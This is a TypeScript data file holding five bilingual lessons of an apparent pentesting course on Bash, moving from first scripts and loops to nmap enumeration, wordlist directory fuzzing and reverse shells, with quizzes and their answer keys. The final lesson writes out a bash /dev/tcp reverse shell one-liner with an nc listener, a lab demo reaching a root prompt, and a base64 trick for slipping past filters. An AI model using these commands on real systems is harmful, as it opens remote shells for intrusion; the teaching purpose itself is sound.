// ── academy/bash-lessons.ts ────────────────────────────────────────
// Subsección Bash del path Scripting para pentesting.
// 5 clases: qué es → variables/args/condicionales → bucles/funciones →
// pentesting I (enumeración) → pentesting II (automatización y reverse shell).

import type { Lesson } from '../types';

export const BASH_LESSONS: Lesson[] = [
  {
    id: 'bash-01',
    pathId: 'scripting',
    order: 1,
    title: 'What is bash: the shell that became a language',
    titleEs: 'Qué es bash: la shell que se volvió lenguaje',
    readingMinutes: 8,
    labRef: 'scenario-01',
    steps: [
      {
        type: 'foxy-narrator',
        messages: [
          {
            es: 'Antes de escribir exploits, vas a escribir scripts. Bash es el lenguaje nativo de la terminal Linux y la base de casi todas las herramientas de pentesting. Esta clase te muestra cómo correr tu primer script.',
            en: "Before writing exploits, you'll write scripts. Bash is the native language of the Linux terminal and the base of almost every pentesting tool. This lesson shows you how to run your first script.",
          },
        ],
      },
      {
        type: 'video',
        src: '/videos/es/sl01-bash-intro.mp4',
        srcEn: '/videos/en/sl01-bash-intro.mp4',
        durationSec: 68,
        caption: 'Bash is the shell that became a language: it is everywhere and automates what you would do by hand. Your first script in three steps — nano, chmod +x and ./script.sh.',
        captionEs: 'Bash es la shell que se volvió lenguaje: está en todos lados y automatiza lo que harías a mano. Tu primer script en tres pasos — nano, chmod +x y ./script.sh.',
      },
      {
        type: 'content',
        title: 'A shell that is also a language',
        titleEs: 'Una shell que también es lenguaje',
        body: 'Bash is two things at once: the **shell** (the program that reads and runs your commands) and a **scripting language**. A script is a plain text file with commands that run in order. It starts with the shebang: `#!/bin/bash` — the line that tells Linux which interpreter should execute the file.',
        bodyEs: 'Bash es dos cosas a la vez: la **shell** (el programa que lee y ejecuta tus comandos) y un **lenguaje de scripting**. Un script es un archivo de texto plano con comandos que se ejecutan en orden. Empieza con el shebang: `#!/bin/bash` — la línea que le dice a Linux qué intérprete debe ejecutar el archivo.',
      },
      {
        type: 'content',
        title: 'Running a script',
        titleEs: 'Ejecutar un script',
        body: 'You create it with `nano`, you give it execute permission with `chmod +x`, and you run it with `./script.sh` (or `bash script.sh` if you prefer not to touch permissions). In the lab, work from `/tmp` — it is world-writable. Three lines, three concepts: shebang, permission, execution.',
        bodyEs: 'Lo creás con `nano`, le das permiso de ejecución con `chmod +x`, y lo ejecutás con `./script.sh` (o `bash script.sh` si preferís no tocar permisos). En el lab, trabajá desde `/tmp` — es escribible por todos. Tres líneas, tres conceptos: shebang, permiso, ejecución.',
      },
      {
        type: 'terminal-demo',
        command: 'nano primer.sh\n#!/bin/bash\necho "Hola, soy un script de pentesting"\nchmod +x primer.sh\n./primer.sh',
        output: 'Hola, soy un script de pentesting',
        explanation: 'Inside nano: type the shebang and the echo, save with Ctrl+O and exit with Ctrl+X. Then chmod gives it execute permission and ./ runs it.',
        explanationEs: 'Dentro de nano: escribí el shebang y el echo, guardá con Ctrl+O y salí con Ctrl+X. Después chmod le da permiso de ejecución y ./ lo corre.',
      },
      {
        type: 'practical-exercise',
        task: 'In the lab terminal, create your first script: nano /tmp/primer.sh, write #!/bin/bash and echo "Hola", save, then chmod +x /tmp/primer.sh and run it with /tmp/primer.sh.',
        taskEs: 'En la terminal del lab, creá tu primer script: nano /tmp/primer.sh, escribí #!/bin/bash y echo "Hola", guardá, después chmod +x /tmp/primer.sh y ejecutalo con /tmp/primer.sh.',
        hint: 'nano /tmp/primer.sh → type #!/bin/bash and echo "Hola" → Ctrl+O, Enter, Ctrl+X → chmod +x /tmp/primer.sh → /tmp/primer.sh',
        hintEs: 'nano /tmp/primer.sh → escribí #!/bin/bash y echo "Hola" → Ctrl+O, Enter, Ctrl+X → chmod +x /tmp/primer.sh → /tmp/primer.sh',
        labId: 'scenario-01',
      },
      {
        type: 'quiz',
        question: 'What does the line #!/bin/bash at the top of a script do?',
        questionEs: '¿Qué hace la línea #!/bin/bash al inicio de un script?',
        options: [
          { es: 'Le da permiso de ejecución', en: 'Gives it execute permission' },
          { es: 'Indica qué intérprete ejecuta el script', en: 'Tells which interpreter should run the script' },
          { es: 'Comenta el archivo', en: 'Comments the file' },
          { es: 'Crea un archivo bash', en: 'Creates a bash file' },
        ],
        correctIndex: 1,
      },
    ],
  },
  {
    id: 'bash-02',
    pathId: 'scripting',
    order: 2,
    title: 'Basics: variables, arguments and conditionals',
    titleEs: 'Bases: variables, argumentos y condicionales',
    readingMinutes: 9,
    labRef: 'scenario-01',
    steps: [
      {
        type: 'foxy-narrator',
        messages: [
          {
            es: 'Un script que hace siempre lo mismo no sirve. Con variables, argumentos y condicionales, tu script se adapta al objetivo: le pasás un host y decide qué hacer.',
            en: "A script that always does the same thing is useless. With variables, arguments and conditionals, your script adapts to the target: you give it a host and it decides what to do.",
          },
        ],
      },
      {
        type: 'video',
        src: '/videos/es/sl02-variables-conditionals.mp4',
        srcEn: '/videos/en/sl02-variables-conditionals.mp4',
        durationSec: 76,
        caption: 'Variables that store data, arguments ($1, $2…) and conditionals that pick the path: a script that adapts to the target.',
        captionEs: 'Variables que guardan datos, argumentos ($1, $2…) y condicionales que eligen el camino: un script que se adapta al objetivo.',
      },
      {
        type: 'content',
        title: 'Variables',
        titleEs: 'Variables',
        body: '`nombre=kali` — no spaces around the =, or it breaks. To read it: `$nombre`. Double quotes expand (`echo "$nombre"` → kali), single quotes do not (`echo \'$nombre\'` → $nombre). To capture a command output: `$(comando)` — e.g. `fecha=$(date)`.',
        bodyEs: '`nombre=kali` — sin espacios alrededor del =, si no se rompe. Para leerla: `$nombre`. Las comillas dobles expanden (`echo "$nombre"` → kali), las simples no (`echo \'$nombre\'` → $nombre). Para capturar la salida de un comando: `$(comando)` — ej. `fecha=$(date)`.',
      },
      {
        type: 'content',
        title: 'Arguments and conditionals',
        titleEs: 'Argumentos y condicionales',
        body: 'Your script can receive arguments: `$0` (the script), `$1` `$2`... (the arguments), `$#` (how many). Conditionals: `if [ "$1" = "scan" ]; then ... fi`. Useful tests: `-f archivo` (exists and is a file), `-d dir` (is a directory), `-z "$var"` (is empty). Note the spaces inside the brackets — they are mandatory.',
        bodyEs: 'Tu script puede recibir argumentos: `$0` (el script), `$1` `$2`... (los argumentos), `$#` (cuántos). Condicionales: `if [ "$1" = "scan" ]; then ... fi`. Tests útiles: `-f archivo` (existe y es archivo), `-d dir` (es directorio), `-z "$var"` (está vacío). Ojo con los espacios dentro de los corchetes — son obligatorios.',
      },
      {
        type: 'terminal-demo',
        command: '#!/bin/bash\nhost=$1\nif [ -z "$host" ]; then\n  echo "Uso: ./ping.sh <host>"\nelse\n  ping -c 2 "$host"\nfi',
        output: '# ./ping.sh → Uso: ./ping.sh <host>\n# ./ping.sh 10.0.0.11 →\nPING 10.0.0.11 (10.0.0.11) 56(84) bytes of data.\n64 bytes from 10.0.0.11: icmp_seq=1 ttl=64 time=0.8 ms',
        explanation: 'The script receives the host in $1. If the argument is empty (-z), it shows usage. Otherwise it pings. This is the skeleton of every recon script.',
        explanationEs: 'El script recibe el host en $1. Si el argumento está vacío (-z), muestra el uso. Si no, pinguea. Este es el esqueleto de todo script de reconocimiento.',
      },
      {
        type: 'quiz',
        question: 'In bash, how do you capture the output of a command into a variable?',
        questionEs: 'En bash, ¿cómo capturás la salida de un comando en una variable?',
        options: [
          { es: 'var = comando', en: 'var = command' },
          { es: 'var=$(comando)', en: 'var=$(command)' },
          { es: 'var=[comando]', en: 'var=[command]' },
          { es: 'var<comando>', en: 'var<command>' },
        ],
        correctIndex: 1,
      },
    ],
  },
  {
    id: 'bash-03',
    pathId: 'scripting',
    order: 3,
    title: 'Loops, functions and text filters',
    titleEs: 'Bucles, funciones y filtros de texto',
    readingMinutes: 9,
    labRef: 'scenario-01',
    steps: [
      {
        type: 'foxy-narrator',
        messages: [
          {
            es: 'El pentesting es repetir cosas a escala: probar 254 hosts, recorrer una wordlist, parsear una salida. Ahí entran los bucles, las funciones y los filtros de texto.',
            en: "Pentesting is repeating things at scale: testing 254 hosts, walking a wordlist, parsing an output. That's where loops, functions and text filters come in.",
          },
        ],
      },
      {
        type: 'video',
        src: '/videos/es/sl03-loops-functions.mp4',
        srcEn: '/videos/en/sl03-loops-functions.mp4',
        durationSec: 72,
        caption: 'Loops to repeat at scale, functions to organize, and grep/awk/sed filters to keep only what matters.',
        captionEs: 'Bucles para repetir a escala, funciones para organizar y filtros grep/awk/sed para quedarte solo con lo que importa.',
      },
      {
        type: 'content',
        title: 'Loops',
        titleEs: 'Bucles',
        body: '`for ip in $(seq 1 254); do ping -c 1 10.0.0.$ip; done` — runs the command for each value. To read a file line by line: `while read linea; do echo "$linea"; done < lista.txt`. Add `&` at the end of a command to run it in the background — key for fast sweeps.',
        bodyEs: '`for ip in $(seq 1 254); do ping -c 1 10.0.0.$ip; done` — ejecuta el comando para cada valor. Para leer un archivo línea por línea: `while read linea; do echo "$linea"; done < lista.txt`. Agregá `&` al final de un comando para correrlo en background — clave para barridos rápidos.',
      },
      {
        type: 'content',
        title: 'Functions and text filters',
        titleEs: 'Funciones y filtros de texto',
        body: 'A function groups commands: `escaneo() { nmap -sV "$1"; }` then call `escaneo 10.0.0.11`. For parsing: `grep` filters lines, `awk` extracts columns (`awk \'{print $1}\'`), `sed` replaces text. Example: `grep "open" nmap.txt | awk \'{print $1}\'` lists the open ports.',
        bodyEs: 'Una función agrupa comandos: `escaneo() { nmap -sV "$1"; }` y después la llamás `escaneo 10.0.0.11`. Para parsear: `grep` filtra líneas, `awk` extrae columnas (`awk \'{print $1}\'`), `sed` reemplaza texto. Ejemplo: `grep "open" nmap.txt | awk \'{print $1}\'` lista los puertos abiertos.',
      },
      {
        type: 'terminal-demo',
        command: 'for ip in $(seq 1 5); do\n  ping -c 1 -W 1 10.0.0.$ip | grep "bytes from" | awk \'{print $4}\' &\ndone\nwait',
        output: '10.0.0.1:\n10.0.0.11:\n10.0.0.22:',
        explanation: 'A mini host sweep: ping each IP with a 1s timeout, keep only the hosts that answered (grep "bytes from") and print their IP (awk $4). The & runs them in parallel; wait holds until all finish.',
        explanationEs: 'Un mini barrido de hosts: pingueá cada IP con timeout de 1s, quedate solo con los que respondieron (grep "bytes from") e imprimí su IP (awk $4). El & los corre en paralelo; wait espera a que terminen todos.',
      },
      {
        type: 'quiz',
        question: 'What does the & at the end of a command inside a loop do?',
        questionEs: '¿Qué hace el & al final de un comando dentro de un bucle?',
        options: [
          { es: 'Lo ejecuta dos veces', en: 'Runs it twice' },
          { es: 'Lo corre en background (en paralelo)', en: 'Runs it in the background (in parallel)' },
          { es: 'Le agrega permisos', en: 'Adds permissions' },
          { es: 'Lo silencia', en: 'Silences it' },
        ],
        correctIndex: 1,
      },
    ],
  },
  {
    id: 'bash-04',
    pathId: 'scripting',
    order: 4,
    title: 'Pentesting I: enumeration with bash',
    titleEs: 'Pentesting I: enumeración con bash',
    readingMinutes: 10,
    labRef: 'scenario-01',
    steps: [
      {
        type: 'foxy-narrator',
        messages: [
          {
            es: 'Ahora sí: el primer caso real. Un script de reconocimiento junta en segundos lo que harías a mano en diez minutos: hosts vivos, puertos abiertos y servicios.',
            en: "Now for the real deal: a recon script gathers in seconds what you'd do by hand in ten minutes: live hosts, open ports and services.",
          },
        ],
      },
      {
        type: 'video',
        src: '/videos/es/sl04-enumeration.mp4',
        srcEn: '/videos/en/sl04-enumeration.mp4',
        durationSec: 69,
        caption: 'Your first real case: ping sweep, nmap and grep/awk to parse. Scan once, parse many times.',
        captionEs: 'Tu primer caso real: ping sweep, nmap y grep/awk para parsear. Escaneás una vez y parseás muchas.',
      },
      {
        type: 'content',
        title: 'The recon workflow',
        titleEs: 'El flujo de reconocimiento',
        body: 'Step by step: 1) find live hosts (ping sweep), 2) scan the interesting one (nmap), 3) parse the result (grep/awk), 4) check the web (curl -sI for headers). A script chains those four steps and prints a clean summary — the same summary you then turn into a report.',
        bodyEs: 'Paso a paso: 1) encontrar hosts vivos (ping sweep), 2) escanear el interesante (nmap), 3) parsear el resultado (grep/awk), 4) revisar la web (curl -sI para cabeceras). Un script encadena esos cuatro pasos e imprime un resumen limpio — el mismo resumen que después convertís en reporte.',
      },
      {
        type: 'content',
        title: 'Parsing tools in action',
        titleEs: 'Herramientas de parseo en acción',
        body: '`nmap -oG out.txt` outputs in grepable format: one line per host with its ports — perfect for awk. `curl -sI http://host` shows the headers: Server and X-Powered-By reveal the stack. `grep -oP \'[0-9]+/tcp open\' nmap.txt | cut -d/ -f1` extracts just the port numbers.',
        bodyEs: '`nmap -oG out.txt` da salida en formato grepable: una línea por host con sus puertos — perfecto para awk. `curl -sI http://host` muestra las cabeceras: Server y X-Powered-By revelan el stack. `grep -oP \'[0-9]+/tcp open\' nmap.txt | cut -d/ -f1` extrae solo los números de puerto.',
      },
      {
        type: 'terminal-demo',
        command: '#!/bin/bash\nhost=$1\nnmap -sV -oG /tmp/scan.txt "$host"\necho "Puertos abiertos:"\ngrep "open" /tmp/scan.txt | grep -oP "[0-9]+/tcp" | cut -d/ -f1',
        output: 'Puertos abiertos:\n21\n22\n80',
        explanation: 'Scan once, parse many times: nmap saves the grepable output, and the script extracts the port numbers with grep + cut. Reusable for every host in the network.',
        explanationEs: 'Escané una vez, parseá muchas: nmap guarda la salida grepable y el script extrae los números de puerto con grep + cut. Reutilizable para cada host de la red.',
      },
      {
        type: 'practical-exercise',
        task: 'In the lab, save a script that runs nmap -sV against 10.0.0.11, saves the output to /tmp/scan.txt and prints the open ports. Then run it and read the result.',
        taskEs: 'En el lab, guardá un script que corra nmap -sV contra 10.0.0.11, guarde la salida en /tmp/scan.txt e imprima los puertos abiertos. Después ejecutalo y leé el resultado.',
        hint: 'nano /tmp/recon.sh → #!/bin/bash → nmap -sV -oG /tmp/scan.txt 10.0.0.11 → grep "open" /tmp/scan.txt → chmod +x /tmp/recon.sh → /tmp/recon.sh',
        hintEs: 'nano /tmp/recon.sh → #!/bin/bash → nmap -sV -oG /tmp/scan.txt 10.0.0.11 → grep "open" /tmp/scan.txt → chmod +x /tmp/recon.sh → /tmp/recon.sh',
        labId: 'scenario-01',
      },
      {
        type: 'quiz',
        question: 'Which nmap option saves output in a format easy to parse with awk/grep?',
        questionEs: '¿Qué opción de nmap guarda la salida en un formato fácil de parsear con awk/grep?',
        options: [
          { es: '-oN', en: '-oN' },
          { es: '-oG', en: '-oG' },
          { es: '-oX', en: '-oX' },
          { es: '-v', en: '-v' },
        ],
        correctIndex: 1,
      },
    ],
  },
  {
    id: 'bash-05',
    pathId: 'scripting',
    order: 5,
    title: 'Pentesting II: automation and reverse shells',
    titleEs: 'Pentesting II: automatización y reverse shells',
    readingMinutes: 10,
    labRef: 'scenario-01',
    steps: [
      {
        type: 'foxy-narrator',
        messages: [
          {
            es: 'Dos jugadas finales con bash: automatizar un ataque contra una wordlist, y levantar una reverse shell cuando ya conseguiste acceso. Con esto cerrás el círculo.',
            en: "Two final plays with bash: automating an attack against a wordlist, and raising a reverse shell once you already got access. That closes the loop.",
          },
        ],
      },
      {
        type: 'video',
        src: '/videos/es/sl05-reverse-shells.mp4',
        srcEn: '/videos/en/sl05-reverse-shells.mp4',
        durationSec: 68,
        caption: 'From scripts that recon to scripts that attack: wordlist fuzzing and a reverse shell with bash.',
        captionEs: 'De scripts que reconocen a scripts que atacan: fuzzing con wordlist y una reverse shell con bash.',
      },
      {
        type: 'content',
        title: 'Automating with wordlists',
        titleEs: 'Automatizar con wordlists',
        body: 'A wordlist is a file with one candidate per line. The pattern: read it line by line and send each one. Example: try directories with `while read dir; do code=$(curl -s -o /dev/null -w "%{http_code}" http://host/$dir); echo "$dir → $code"; done < wordlist.txt`. The HTTP code tells you if it exists (200) or not (404).',
        bodyEs: 'Una wordlist es un archivo con un candidato por línea. El patrón: leerla línea por línea y enviar cada uno. Ejemplo: probar directorios con `while read dir; do code=$(curl -s -o /dev/null -w "%{http_code}" http://host/$dir); echo "$dir → $code"; done < wordlist.txt`. El código HTTP te dice si existe (200) o no (404).',
      },
      {
        type: 'content',
        title: 'Reverse shells: bash giving you a remote shell',
        titleEs: 'Reverse shells: bash te da una shell remota',
        body: 'A reverse shell makes the target connect BACK to you — it bypasses inbound firewalls. The classic bash one-liner: `bash -i >& /dev/tcp/IP/PUERTO 0>&1`. You listen with `nc -lvnp PUERTO` on your machine. To dodge filters, encode it: `echo "bash -i >& /dev/tcp/..." | base64 -w0` and decode on the target.',
        bodyEs: 'Una reverse shell hace que el objetivo se conecte HACIA VOS — saltea los firewalls de entrada. El one-liner clásico de bash: `bash -i >& /dev/tcp/IP/PUERTO 0>&1`. Escuchás con `nc -lvnp PUERTO` en tu máquina. Para esquivar filtros, encodelo: `echo "bash -i >& /dev/tcp/..." | base64 -w0` y decodelo en el objetivo.',
      },
      {
        type: 'terminal-demo',
        command: 'nc -lvnp 4444\n# (en el objetivo)\nbash -i >& /dev/tcp/10.0.0.10/4444 0>&1',
        output: 'Listening on 0.0.0.0 4444\nConnection received on 10.0.0.11 44348\nbash: cannot set terminal process group (1): Inappropriate ioctl\nroot@target:~#',
        explanation: 'The attacker listens on 4444; the target executes the one-liner and connects back. The root@target prompt is your shell on the target. The terminal error is normal — the shell works anyway.',
        explanationEs: 'El atacante escucha en 4444; el objetivo ejecuta el one-liner y se conecta de vuelta. El prompt root@target es tu shell en el objetivo. El error de terminal es normal — la shell funciona igual.',
      },
      {
        type: 'quiz',
        question: 'Why does an attacker prefer a reverse shell over listening for incoming connections?',
        questionEs: '¿Por qué un atacante prefiere una reverse shell a esperar conexiones entrantes?',
        options: [
          { es: 'Es más rápida', en: 'It is faster' },
          { es: 'Bypassea los firewalls que bloquean conexiones entrantes', en: 'It bypasses firewalls blocking inbound connections' },
          { es: 'No deja logs', en: 'It leaves no logs' },
          { es: 'No necesita red', en: 'It needs no network' },
        ],
        correctIndex: 1,
      },
    ],
  },
];
